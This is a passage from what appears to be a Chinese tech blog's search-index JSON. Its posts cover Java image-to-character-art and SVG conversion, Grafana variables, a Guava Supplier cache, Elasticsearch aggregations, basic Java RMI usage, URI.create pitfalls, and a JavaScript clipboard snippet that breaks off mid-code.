一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/08/211108-封装一个根据路径获取文件资源的工具类/"},{"title":"211116-Java实现图片转字符图片示例demo","text":"前面介绍了一篇java实现图片灰度化处理的小demo，接下来再介绍一个有意思的东西，将一个图片转换成字符图片 借助前面图片灰度化处理的知识点，若我们希望将一张图片转成字符图片，同样可以遍历每个像素点，然后将像素点由具体的字符来替换，从而实现字符化处理 基于上面这个思路，具体的实现就很清晰了 12345678910111213141516171819202122232425@Testpublic void testRender() throws IOException { String file = \"http://i0.download.fd.52shubiao.com/t_960x600/g1/M00/10/17/oYYBAFWvR5-IeXHuAAd5kPb8eSgAACm0QF50xIAB3mo414.jpg\"; // 从网络上下载图片 BufferedImage img = ImageIO.read(FileReadUtil.getStreamByFileName(file)); int w = img.getWidth(), h = img.getHeight(); // 创建新的字符图片画板 BufferedImage gray = new BufferedImage(w, h, img.getType()); Graphics2D g2d = gray.createGraphics(); g2d.setColor(null); g2d.fillRect(0, 0, w, h); Font font = new Font(\"宋体\", Font.BOLD, 1); g2d.setFont(font); for (int x = 0; x &lt; w; x ++) { for (int y = 0; y &lt; h; y ++) { g2d.setColor(ColorUtil.int2color(img.getRGB(x, y))); g2d.drawString(\"灰\", x, y); } } g2d.dispose(); System.out.printf(\"渲染完成\");} 注意上面的实现，在会字符的时候，先取出源像素点的色彩，然后重新设置给g2d，这个int转color也比较简单，实现如下 1234567public static Color int2color(int color) { int a = (0xff000000 &amp; color) &gt;&gt;&gt; 24; int r = (0x00ff0000 &amp; color) &gt;&gt; 16; int g = (0x0000ff00 &amp; color) &gt;&gt; 8; int b = (0x000000ff &amp; color); return new Color(r, g, b, a);} 这样就实现了一个基础版的转字符图了，实际跑一下看看效果 这下尴尬了，输出的并不是我们预期的字符图，那么问题出在哪呢？ 仔细看上面的文字大小为1，文字太小，导致即使是有字符组件的图，最终肉眼看起来和原图也没啥区别 那么我们就试一下将这个文字搞大点，将n*n个像素点作为一个文字渲染区域，这样我们需要调整一下遍历的步长；其次就是这个区域的颜色怎么定 直接取均值 1234567891011121314151617181920212223242526/** * 求取多个颜色的平均值 * * @return */Color getAverage(BufferedImage image, int x, int y, int w, int h) { int red = 0; int green = 0; int blue = 0; int size = 0; for (int i = y; (i &lt; h + y) &amp;&amp; (i &lt; image.getHeight()); i++) { for (int j = x; (j &lt; w + x) &amp;&amp; (j &lt; image.getWidth()); j++) { int color = image.getRGB(j, i); red += ((color &amp; 0xff0000) &gt;&gt; 16); green += ((color &amp; 0xff00) &gt;&gt; 8); blue += (color &amp; 0x0000ff); ++size; } } red = Math.round(red / (float) size); green = Math.round(green / (float) size); blue = Math.round(blue / (float) size); return new Color(red, green, blue);} 另外的就是改一下遍历的步长 123456789101112131415161718192021222324252627@Testpublic void testRender() throws IOException { String file = \"http://i0.download.fd.52shubiao.com/t_960x600/g1/M00/10/17/oYYBAFWvR5-IeXHuAAd5kPb8eSgAACm0QF50xIAB3mo414.jpg\"; // 从网络上下载图片 BufferedImage img = ImageIO.read(FileReadUtil.getStreamByFileName(file)); int w = img.getWidth(), h = img.getHeight(); // 创建新的灰度图片画板 BufferedImage gray = new BufferedImage(w, h, img.getType()); Graphics2D g2d = gray.createGraphics(); g2d.setColor(null); g2d.fillRect(0, 0, w, h); int size = 12; Font font = new Font(\"宋体\", Font.BOLD, size); g2d.setFont(font); for (int x = 0; x &lt; w; x += size) { for (int y = 0; y &lt; h; y += size) { Color avgColor = getAverage(img, x, y, size, size); g2d.setColor(avgColor); g2d.drawString(\"灰\", x, y); } } g2d.dispose(); System.out.printf(\"渲染完成\");} 再次执行之后结果如下，实现了我们的预期效果 最后再介绍一个更好用的姿势，直接使用开源项目 https://github.com/liuyueyi/quick-media 来实现图片字符画 使用这个项目的 image-plugins 之后，生成一个灰度图就很简单了 123456789public void testCharImg() throws IOException { String img = \"http://hbimg.b0.upaiyun.com/2b79e7e15883d8f8bbae0b1d1efd6cf2c0c1ed1b10753-cusHEA_fw236\"; BufferedImage out = ImgPixelWrapper.build().setSourceImg(img).setBlockSize(2) .setPixelType(PixelStyleEnum.CHAR_COLOR) .setChars(\"小灰灰blog\") .build() .asBufferedImg(); System.out.println(out);} 注意这个ImgPixelWrapper封装类，处理基础的字符处理之外，还支持生成灰度图，gif图转字符动画，图片像素化（如马赛克…） 至于quick-media这个项目就更有意思了，java侧若想生成酷炫的二维码，选择它绝对不会让你失望；有兴趣的小伙伴可以瞅一瞅 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/16/211116-Java实现图片转字符图片示例demo/"},{"title":"211026-Grafana prometheus变量支持include all设置方法","text":"使用Prometheus进行采样收集，借助Grafana进行大盘展示，可以说是系统监控层面的基本操作了，在grafana的大盘配置时，借助变量的灵活性，来展示不同维度的数据表盘比较常见 现在有这样一个场景，一个应用有多台机器，我们设置一个变量 instance 来表示具体的实例ip，支持通过ip来选择不同机器的监控，怎么操作？ 1.变量配置要实现上面这个case，第一步就是设置一个变量 注意上面的变量配置，label_values(instance) 获取的是所有的实例ip，然而一般的情况下，我们需要针对应用维度进行区分，比如每个上报的metric，都包含application，现在我只希望查看prometheus-example应用的相关信息 测试变量配置可以如下 1label_values(http_server_requests_seconds_count{application=&quot;prometheus-example&quot;}, instance) 注意http_server_requests_seconds_count 这个属于上报metric name，选一个实际有的即可，接下来配置大盘 2. include all配置上面这个完成了一个基本的变量使用配置，但是有这么个问题，如果我想查这个应用所有机器的监控，该怎么办？ 为了支持使用全部，我们的metrics的表达式，就不能使用之前的精确匹配了，需要改成正则方式 1(rate(http_server_requests_seconds_count{instance=~&quot;$ip&quot;}[1m])) 3. 小结借助Grafana的变量配置来实现大盘的条件筛选，其中变量配置关键点在于 1234# 获取 &apos;label == 变量名&apos; 的所有label-valuelabel_values(变量名)# 加上条件限定的变量配置label_values(metric_name{tagName=tagValue}, 变量名) 其次在大盘的metric配置中，对于include all的支持，关键点在于promql的使用 = : 选择与提供的字符串完全相同的标签。 != : 选择与提供的字符串不相同的标签。 =~ : 选择正则表达式与提供的字符串（或子字符串）相匹配的标签。 !~ : 选择正则表达式与提供的字符串（或子字符串）不匹配的标签。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/10/26/211026-Grafana-prometheus变量支持include-all设置方法/"},{"title":"211120-Java实现Gif图转字符动图","text":"前面介绍了两篇基于jdk实现图片灰度处理、转字符图片的操作，接下来我们在将之前的能力扩展一下，支持将一个gif图灰度化或者转gif字符图 本文的实现主要在前面两篇文章的基础上来实现，推荐没有看过的小伙伴也可以瞅一眼 Java实现图片灰度化 Java实现图片转字符图片示例demo 单张图的灰度化与转字符实现之后，gif图的实现就简单多了；gif图无非是多张图组合而成，将每一张图转换之后，再重新组装成gif图就完事了 这里我们使用的gif工具类来自于https://github.com/liuyueyi/quick-media/tree/master/plugins/base-plugin/src/main/java/com/github/hui/quick/plugin/base/gif 核心关键类为GifEncode与GifDecode；借助它来实现gif图的加载与保存 首先我们将上篇博文中的转字符图的方法抽取一下 12345678910111213141516171819202122232425262728293031323334353637383940414243Color getAverage(BufferedImage image, int x, int y, int w, int h) { int red = 0; int green = 0; int blue = 0; int size = 0; for (int i = y; (i &lt; h + y) &amp;&amp; (i &lt; image.getHeight()); i++) { for (int j = x; (j &lt; w + x) &amp;&amp; (j &lt; image.getWidth()); j++) { int color = image.getRGB(j, i); red += ((color &amp; 0xff0000) &gt;&gt; 16); green += ((color &amp; 0xff00) &gt;&gt; 8); blue += (color &amp; 0x0000ff); ++size; } } red = Math.round(red / (float) size); green = Math.round(green / (float) size); blue = Math.round(blue / (float) size); return new Color(red, green, blue);}private BufferedImage parseImg(BufferedImage img) { int w = img.getWidth(), h = img.getHeight(); // 创建新的灰度图片画板 BufferedImage out = new BufferedImage(w, h, img.getType()); Graphics2D g2d = out.createGraphics(); g2d.setColor(null); g2d.fillRect(0, 0, w, h); int size = 12; Font font = new Font(\"宋体\", Font.BOLD, size); g2d.setFont(font); for (int x = 0; x &lt; w; x += size) { for (int y = 0; y &lt; h; y += size) { Color avgColor = getAverage(img, x, y, size, size); g2d.setColor(avgColor); g2d.drawString(\"灰\", x, y); } } g2d.dispose(); return out;} 接着就是Gif的操作了 123456789101112131415161718192021222324@Testpublic void testRender() throws IOException { String file = \"https://c-ssl.duitang.com/uploads/item/201707/11/20170711194634_nTiK5.thumb.1000_0.gif\"; // 从网络上下载图片 GifDecoder decoder = new GifDecoder(); decoder.read(FileReadUtil.getStreamByFileName(file)); // 这里是核心的转换逻辑 List&lt;ImmutablePair&lt;BufferedImage, Integer&gt;&gt; frames = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; decoder.getFrameCount(); i++) { BufferedImage img = decoder.getFrame(i); frames.add(ImmutablePair.of(parseImg(img), decoder.getDelay(i))); } // 下面是保存gif图 File save = new File(\"/tmp/out2.gif\"); ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); GifHelper.saveGif(frames, outputStream); FileOutputStream out = new FileOutputStream(save); out.write(outputStream.toByteArray()); out.flush(); out.close(); System.out.printf(\"渲染完成\");} 上图转换成功之后，输出如下 如果希望输出图片更像原图，可以修改上面的fontSize，比如上面用的是12，可以调整成8，6等值，根据实际情况进行选择 有的小伙伴可能会说了，动漫的gif图转换之后相似度还可以，那么真实人物图转换之后呢？ 接下来我们借助开源项目 https://github.com/liuyueyi/quick-media 来迅速的实现一个gif图转换 下图来自网络，有兴趣的自己打开查看，就不贴上了😏）http://n.sinaimg.cn/sinacn/w390h219/20171231/0ac1-fyqefvw5238474.gif 12345678910111213141516@Testpublic void testGif() throws Exception { String img = \"http://n.sinaimg.cn/sinacn/w390h219/20171231/0ac1-fyqefvw5238474.gif\"; ImgPixelWrapper.build().setSourceImg(img) .setBlockSize(7) .setPixelType(PixelStyleEnum.CHAR_COLOR) // 生成的gif图放大为原来的两倍 .setRate(2d) // 支持设置字体 .setFontStyle(Font.BOLD) // 这里设置生成字符图中的字符集 .setChars(\"灰\") .build() .asFile(prefix + \"/out3.gif\"); System.out.println(\"--------\");} 最后提个小问题，gif图都能生成字符图了，那么视频也可以生成字符视频么？ 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/20/211120-Java实现Gif图转字符动图/"},{"title":"211110-Guava之Supplier缓存使用实例","text":"使用guava作内存缓存，大多数小伙伴应该都使用过，通过CacheBuilder创建LoadingCache一个kv格式的缓存，如果我们需要缓存的只是一个value呢？ 针对这种场景，接下来介绍一种基于Supplier来实现的缓存方式 1. Supplier使用姿势guava的Supplier与jdk的Supplier从接口定义上来看没什么区别，对外只提供了一个get()方法 123456@FunctionalInterface@GwtCompatiblepublic interface Supplier&lt;T&gt; extends java.util.function.Supplier&lt;T&gt; { @CanIgnoreReturnValue T get();} 重点需要关注的是Supplier创建的姿势，借助Suppliers来实现 下面是几个常见的创建姿势： memoize: delegate为具体的获取值的委托类，需要注意的是，delegate的具体实现只会在首次时调用；这种方式相当于持久缓存 memoizeWithExpiration：delegate的返回值，会缓存一段时间；缓存时间过后，会重新调用一下delegate来获取返回值 ofInstance: 直接传参 12345public static &lt;T&gt; Supplier&lt;T&gt; memoize(Supplier&lt;T&gt; delegate)public static &lt;T&gt; Supplier&lt;T&gt; memoizeWithExpiration(Supplier&lt;T&gt; delegate, long duration, TimeUnit unit)public static &lt;T&gt; Supplier&lt;T&gt; ofInstance(@Nullable T instance) 基于上面的方法描述，如果我们想实现一个10s缓存，那么可以选择memoizeWithExpiration来实现 1234567AtomicInteger atomicInteger = new AtomicInteger(1);Supplier&lt;Integer&gt; cache = Suppliers.memoizeWithExpiration(this::ret, 10, TimeUnit.SECONDS);private int ret() { System.out.println(\"------- 更新 value --------\"); return atomicInteger.getAndAdd(2) ;} 上面定义了一个内存缓存cache, 缓存10s，调用时若缓存失效，会重新调用ret()刷新缓存 测试case就比较简单了 123456789@Testpublic void testSupplier() throws InterruptedException { for (int i = 0; i &lt; 10; i++) { System.out.print(cache.get() + \" | \"); } System.out.println(); Thread.sleep(10000); System.out.println(cache.get());} 输出如下 1234------- 更新 value --------1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | ------- 更新 value --------3 2. 缓存刷新使用Supplier当缓存时，需要注意的一点就是没有缓存失效的方法可供调用；对于LoadingCache若是想失效缓存，可以通过调用 invalidate来主动失效指定的缓存，那么Supplier 可以怎么整？ 直接重新赋值 比如当我们希望刷新时，可以直接覆盖就的supplier即可 123public void refresh() { cache = Suppliers.memoizeWithExpiration(this::ret, 10, TimeUnit.SECONDS);} 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/10/211110-Guava之Supplier缓存使用实例/"},{"title":"211123-ElasticSearch分组查询抛异常？","text":"在使用es进行组合查询的时候，遇到一个非常有意思的场景，特此记录一下 某些场景下，直接针对某个Field进行分组查询，居然无法返回结果，会给出类似Text fields are not optimised for operations that require per-document field data like aggregations and sorting, so these operations are disabled by default的提示信息，接下来看一下这个问题是个什么情况，以及如何解决 1. 数据准备初始化一个索引，写入一些测试数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162post second-index/_doc{ \"url\": \"/test\", \"execute\": { \"args\": \"id=10&amp;age=20\", \"cost\": 10, \"res\": \"test result\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"url\": \"/test\", \"execute\": { \"args\": \"id=20&amp;age=20\", \"cost\": 11, \"res\": \"test result2\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"url\": \"/test\", \"execute\": { \"args\": \"id=10&amp;age=20\", \"cost\": 12, \"res\": \"test result2\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"url\": \"/hello\", \"execute\": { \"args\": \"tip=welcome\", \"cost\": 2, \"res\": \"welcome\" }, \"response_code\": 200, \"app\": \"yhh_demo\"}post second-index/_doc{ \"url\": \"/404\", \"execute\": { \"args\": \"tip=welcome\", \"cost\": 2, \"res\": \"xxxxxxxx\" }, \"response_code\": 404, \"app\": \"yhh_demo\"} 2. 分组查询基本知识点相当于sql中的group by，常用于聚合操作中的统计计数的场景 在es中，使用aggs来实现，语法如下 12345678\"aggs\": { \"agg-name\": { // 这个agg-name 是自定义的聚合名称 \"terms\": { // 这个terms表示聚合的策略，根据 field进行分组 \"field\": \"\", \"size\": 10 } }} 比如我们希望根据url统计访问计数，对应的查询可以是 123456789101112131415GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url\", \"size\": 2 } } }} 直接执行上面的分组查询，结果问题来了 右边返回的提示信息为Text fields are not optimised for operations that require per-document field data like aggregations and sorting, so these operations are disabled by default. Please use a keyword field instead. Alternatively, set fielddata=true on [url] in order to load field data by uninverting the inverted index. Note that this can use significant memory这个异常 3. 解决方案简单来说，上面这个问题，就是因为url这个字段为text类型，默认情况下这种类型的不走索引，不支持聚合排序，如果需要则需要设置fielddata=true，或者使用url的分词url.keyword 123456789101112131415GET second-index/_search{ \"query\": { \"match_all\": {} }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url.keyword\", \"size\": 2 } } }} 注意 虽然我们更注重的是分组后的结果，但是hits中依然会返回命中的文档，若是只想要分组后的统计结果，可以在查询条件中添加 size:0 聚合操作和查询条件是可以组合的，如只查询某个url对应的计数 12345678910111213141516171819GET second-index/_search{ \"query\": { \"term\": { \"url.keyword\": { \"value\": \"/test\" } } }, \"size\": 1, \"aggs\": { \"my-agg\": { \"terms\": { \"field\": \"url.keyword\", \"size\": 2 } } }} 上面介绍了TEXT类型的field，根据分词进行聚合操作；还有一种方式就是设置fielddata=true，操作姿势如下 123456789PUT second-index/_mapping{ \"properties\": { \"url\": { \"type\": \"text\", \"fielddata\": true } }} 修改完毕之后，再根据url进行分组查询，就不会抛异常了 4. 小结最后小结一下，当我们使用es的某个field进行分组操作时，此时需要注意 当这个field类型为text，默认的场景下是不支持分组操作的，如果非要用它进行分组查询，有两个办法 使用它的索引字段，如 url.keyword 在索引的filed上添加fileddata: true 配置 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/23/211123-ElasticSearch分组查询抛异常？/"},{"title":"211213-JDNI注入：RMI基本知识点介绍","text":"远程方法调用，现在更多的使用RPC来处理，至于RMI好像没有那么多了，最近闹的火热的log4j2漏洞，又让几个关键词jndi,rmi,ldap频繁出现；对于我这种面向Spring编程的javer而言，这些是啥? 干嘛用的？为啥漏洞这么多？ 接下来简单学习下RMI的基本知识点 1. RMI科普 参考：https://www.jianshu.com/p/de85fad05dcb Java RMI，即 远程方法调用(Remote Method Invocation)，一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于Java虚拟机(JVM)，因此它仅支持从一个JVM到另一个JVM的调用。 可以简单的将RMI理解为jdk原生提供的rpc支持方式 2. 基础体验基于上面的RMI架构图，要体验一下RMI的基本功能，非常简单了 2.1 服务端要提供一个rmi服务端就比较简单了，不需要额外引入依赖，直接使用 类似于我们常见的rpc框架，先提供一个接口，终点注意它需要继承Remote接口 12345import java.rmi.Remote;public interface HelloService extends Remote { // 方法抛出异常，这个非常重要，不能少 String hello() throws RemoteException;} 对应的实现类，重点注意继承自UnicastRemoteObject 1234567891011121314151617import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.time.LocalDateTime;/** * @author yihui * @date 21/12/13 */public class HelloServiceImpl extends UnicastRemoteObject implements HelloService { protected HelloServiceImpl() throws RemoteException { } @Override public String hello() throws RemoteException { return \"hello: \" + LocalDateTime.now(); }} 最后就是启动服务，提供一个上面的接口 1234567891011public class RmiServer { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(8181); // 创建一个远程对象 HelloService hello = new HelloServiceImpl(); registry.bind(\"hello\", hello); System.out.println(\"服务已启动\"); Thread.currentThread().join(); }} 2.2 客户端客户端访问rmi服务就很简单了，两行代码即可 123456789public class RmiClient { public static void main(String[] args) throws Exception{ Registry registry = LocateRegistry.getRegistry(8181); HelloService hello = (HelloService) registry.lookup(\"hello\"); String response = hello.hello(); System.out.println(response); }} 2.3 测试先启动服务端，再启动客户端，可以看到客户端会拿到一个HelloService的实例，可以直接像调用本地方法一下访问这个方法 注意上面这个case，客户端拿到实例，访问实例方法，这个逻辑是在哪里执行的呢？（客户端还是服务端？） 服务端执行（可以通过在实现类中添加一行日志，看下这个日志是在服务端输出的还是客户端输出的） 3.naming方式除了上面的这种方式之外，使用Naming方式的也非常普遍，如下 服务端，新的写法如下 123456public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(8181); Naming.bind(\"rmi://localhost:8181/hello\", hello); System.out.println(\"服务已启动\"); Thread.currentThread().join();} 客户端的写法如下 123456public static void main(String[] args) throws Exception { String remoteAddr=\"rmi://localhost:8181/hello\"; HelloService hello = (HelloService) Naming.lookup(remoteAddr); String response = hello.hello(); System.out.println(response);} 这种方式与前面的效果相同，区别在于当有多个服务端时，使用naming的方式，可以指定ip + 端口号来获取对应的服务提供者 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/13/211213-JDNI注入：RMI基本知识点介绍/"},{"title":"211209-Java使用URI.create()注意事项","text":"记录一个在实际使用过程中遇到的问题，在解析一个url格式的字符串中的域名时，直接使用下面这种姿势 123456789101112131415161718192021public static ImmutablePair&lt;/**host*/String, /**uri*/String&gt; foramtUri(String uri) { // uri中空格去除，避免转换异常 URI u = URI.create(uri); String host = u.getHost(); if (u.getPort() &gt; 0 &amp;&amp; u.getPort() != 80) { host = host + \":80\"; } String baseUri = u.getPath(); if (u.getFragment() != null) { baseUri = baseUri + \"#\" + u.getFragment(); } if (StringUtils.isNotBlank(baseUri)) { baseUri = host + baseUri; } else { baseUri = host; } return ImmutablePair.of(host, baseUri);} 正常使用上面这种进行解析，没啥问题，结果某天突然抛了个异常 12345public static void main(String[] args) { String url = \"https://spring.hhui.top/spring-blog/2021/08/31/210831-SpringBoot系列之Mybatis CURD基本使用姿势-注解篇/\"; ImmutablePair&lt;String, String&gt; ans = foramtUri(url); System.out.println(ans);} 直接抛出了异常 123456Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Illegal character in path at index 74: https://spring.hhui.top/spring-blog/2021/08/31/210831-SpringBoot系列之Mybatis CURD基本使用姿势-注解篇/ at java.net.URI.create(URI.java:852) at com.git.hui.story.common.URIUtil.foramtUri(URIUtil.java:15) at com.git.hui.story.common.URIUtil.main(URIUtil.java:37)Caused by: java.net.URISyntaxException: Illegal character in path at index 74: https://spring.hhui.top/spring-blog/2021/08/31/210831-SpringBoot系列之Mybatis CURD基本使用姿势-注解篇/ at java.net.URI$Parser.fail(URI.java:2847) 从异常提示上可以很清楚看到，根源在于非法的字符，但是从肉眼上看，并没有什么问题啊，没有什么特殊字符，也没有表情符，讲道理不应该存在问题啊 首先观察url字符串，特殊点多半在于空格了，去掉之后再试一下，发现居然成功了； 接下来问题来了，什么样的字符在通过URI.create转换时会认为是非法的呢？ 空格 引号 尖括号: 引号和尖括号通常用于在普通文本中起到分隔Url的作用 #: 对于#需要注意为止，不能出现在域名中 % {}|\\^[]~` 上面这个方法的基本诉求比较简单，就是获取域名，所以可以直接解析域名的方式来解决，当然也可以针对上面的特殊字符进行替换处理来避免这个问题 从根本上来说，关键在于不要出现这种不满足uri规范的数据才是真理 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/09/211209-Java使用URI-create-注意事项/"},{"title":"211126-Java实现位图转矢量图","text":"通过前面几篇图片转字符、灰度图的文章介绍之后，接下来我们再来看一个有意思的东西，基于前文的基础，实现位图转矢量图的功能 关于位图与矢量图的简单理解如下： 位图：如Jpg/png，放大之后会失真，看到像素块 矢量图：如svg，放大图片也不会失真 1. 实现策略要实现位图转矢量图，可不是一个简单的活；当然我们这里也不追求完美实现，在前文的基础上，可以想到一个实现策略 首先根据位图输出字符画 然后通过字符画，来生成矢量图 基于上面这个策略，第一步生成字符前一篇博文已经介绍过了；接下来重点就是如何根据输出的字符数组，来生成svg呢？ 2. 实现方法第一步位图输出字符画的代码就不贴了，有兴趣的小伙伴可以参考前文 211121-Java实现图片转字符输出示例demo - 一灰灰Blog 接下来我们重点看一下如何根据生成的List&lt;String&gt;来生成svg图 首先我们定义一个svg模板，用于来表示基于字符输出的矢量图，如下 123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 {width} {height}\" style=\"width: 100%; height: 100%; overflow: auto; fill: {BG_COLOR}\"&gt; &lt;script type=\"text/javascript\"&gt;&lt;![CDATA[window.addEventListener('load',function() { var bounding_rect = document.getElementById(\"bounding-rect\"); var text = document.getElementById(\"ascii\"); var bb_text = text.getBBox(); var font_size = Math.round(1e3 * bb_text.height / bb_text.width) / 1e3; text.setAttribute(\"font-size\", font_size + \"px\"); bb_text = text.getBBox(); bounding_rect.setAttribute(\"width\", bb_text.width); bounding_rect.setAttribute(\"height\", bb_text.height);}, false); ]]&gt;&lt;/script&gt; &lt;style type=\"text/css\"&gt; text.ascii-art { user-select: none; whiteSpace: \"pre\"; fill: {FONT_COLOR}; -webkit-user-select:none; -khtml-user-select:none; -moz-user-select:none; -ms-user-select:none; } &lt;/style&gt; &lt;rect x=\"0\" y=\"0\" height=\"100%\" width=\"100%\" id=\"bounding-rect\"/&gt; &lt;text x=\"0\" y=\"0\" id=\"ascii\" font-family=\"monospace, courier\" text-anchor=\"start\" font-size=\"1px\" class=\"ascii-art\"&gt; &lt;tspan x=\"0\" dy=\"0.794%\" textLength=\"100%\" xml:space=\"preserve\"&gt; ux &lt;/tspan&gt; &lt;tspan x=\"0\" dy=\"0.794%\" textLength=\"100%\" xml:space=\"preserve\"&gt; ..... &lt;/tspan&gt; &lt;/text&gt;&lt;/svg&gt; 对于上面的模板中，有几个关键值需要替换 svg 标签中 {width}: 生成矢量图的宽度 {height}: 生成矢量图的高度 {BG_COLOR}: 背景颜色 style 样式设置 {FONT_COLOR}: 字符渲染颜色 其次tspan标签内容就是我们需要输出的字符，一行字符对应一个tspan标签 因此我们的实现逻辑就是上面这个模板的关键字替换输出了 12345678910111213141516171819202122232425262728/** * 字符转svg矢量图 * * @param lines * @param bgColor * @param fontColor * @return */public static String ascii2svg(List&lt;String&gt; lines, String bgColor, String fontColor) { StringBuilder builder = new StringBuilder(); int height = lines.size(); int width = lines.stream().max(Comparator.comparingInt(String::length)).get().length(); builder.append(StrUtil.replace(SVG_START, \"{width}\", String.valueOf(width), \"{height}\", String.valueOf(height), \"{BG_COLOR}\", bgColor, \"{FONT_COLOR}\", fontColor)); // 计算tspan标签中的dy值 float dy = 100.0f / height; String start = String.format(\"&lt;tspan x=\\\"0\\\" dy=\\\"%.3f%%\\\" textLength=\\\"100%%\\\" xml:space=\\\"preserve\\\"&gt;\", dy); String end = \"&lt;/tspan&gt;\"; for (String line : lines) { builder.append(start) // 转义支持 .append(StrUtil.replace(line,\"&amp;\", \"&amp;amp;\", \"\\\"\", \"&amp;quot;\", \"&lt;\", \"&amp;lt;\", \"&gt;\", \"&amp;gt;\")) .append(end).append(\"\\n\"); } builder.append(SVG_END); return builder.toString();} 注意上面的实现逻辑中的几个变量就是上面模板的关键值，就不重复输出了；详情看文末的源码查看 SVG_START SVG_END 3. 实测演示上面已经贴出了核心的实现代码，接下来我们根据成品来看一下输出效果如何；下面是直接使用封装好的方法来调用测试 项目源码：https://github.com/liuyueyi/quick-media/tree/master/plugins/image-plugin 123456789101112@Testpublic void testSvg() throws Exception { String file = \"http://pic.dphydh.com/pic/newspic/2017-12-13/505831-1.png\"; // String file = \"http://5b0988e595225.cdn.sohucs.com/images/20200410/76499041d3b144b58d6ed83f307df8a3.jpeg\"; ImgPixelWrapper.build() .setSourceImg(file) .setBlockSize(3) .setRate(0.6) .setPixelType(PixelStyleEnum.CHAR_BLACK) .build() .asSvgFile(prefix + \"/out.svg\");} 输出的svg文件如下 皮卡丘.svg 冰雪女王.svg 实例图: 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/26/211126-Java实现位图转矢量图/"},{"title":"210514-IDEA代码修改不生效,需要mvn install问题记录","text":"最近用idea开发一个项目，遇到一个鬼畜的问题，代码修改之后，启动测试发现不生效，只有重新mvn clean install之后才能加载到改动的代码 这就有点过分了，怀疑是idea的配置问题导致的，没有什么特别好的办法，只能删配置重新导入 删除 .idea文件夹 删除 *.iml文件 重新导入项目 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/05/13/210514-IDEA代码修改不生效-需要mvn-install问题记录/"},{"title":"211111-Js实现粘贴板中写入text","text":"记录一下JS实现向粘贴板中写文本的方式 1234567891011121314151617181920/** * 写入粘贴板 * @param text * @returns {boolean} */function execCoy(text) { text = String(text); input = document.createElement('INPUT'); input.style.opacity = 0; input.style.position = 'absolute'; input.style.left = '-100000px'; document.body.appendChild(input); input.value = text; input.select(); input.setSelectionRange(0, 